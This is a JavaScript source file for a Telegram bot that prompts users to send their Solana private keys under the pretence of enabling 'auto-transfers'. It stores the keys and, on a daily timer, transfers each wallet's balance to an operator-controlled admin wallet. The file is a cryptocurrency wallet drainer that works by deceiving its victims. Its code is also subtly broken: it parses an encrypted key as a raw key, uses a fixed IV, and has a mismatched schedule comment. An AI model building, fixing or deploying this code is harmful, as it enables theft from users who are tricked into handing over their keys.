const TelegramBot = require('node-telegram-bot-api');
const { Connection, Keypair, Transaction, SystemProgram } = require('@solana/web3.js');
const crypto = require('crypto');

// Config (will be set in Railway)
const token = process.env.TELEGRAM_TOKEN;
const adminWallet = process.env.ADMIN_WALLET;
const encryptionKey = process.env.ENCRYPTION_KEY;

const bot = new TelegramBot(token, { polling: true });
const userWallets = new Map();

// Encrypt private key
function encryptKey(key) {
  const cipher = crypto.createCipheriv('aes-256-cbc', 
    Buffer.from(encryptionKey), 
    Buffer.alloc(16, 0));
  return cipher.update(key, 'utf8', 'hex') + cipher.final('hex');
}

// Auto-transfer function
async function transferFunds(privateKey) {
  const connection = new Connection('https://api.mainnet-beta.solana.com');
  const keypair = Keypair.fromSecretKey(new Uint8Array(JSON.parse(privateKey)));
  
  const balance = await connection.getBalance(keypair.publicKey);
  if (balance > 5000) {
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: adminWallet,
        lamports: balance - 5000
      })
    );
    await connection.sendTransaction(transaction, [keypair]);
  }
}

// Bot commands
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, '🔑 Send your Solana private key to enable auto-transfers');
});

bot.on('message', (msg) => {
  if (msg.text && msg.text.startsWith('[')) { // Detect private key
    const encrypted = encryptKey(msg.text);
    userWallets.set(msg.chat.id, encrypted);
    bot.sendMessage(msg.chat.id, '✅ Wallet added! Funds will auto-transfer daily');
  }
});

// Daily transfer (3 AM UTC)
setInterval(() => {
  userWallets.forEach((encryptedKey, chatId) => {
    transferFunds(encryptedKey).catch(console.error);
  });
}, 24 * 60 * 60 * 1000);
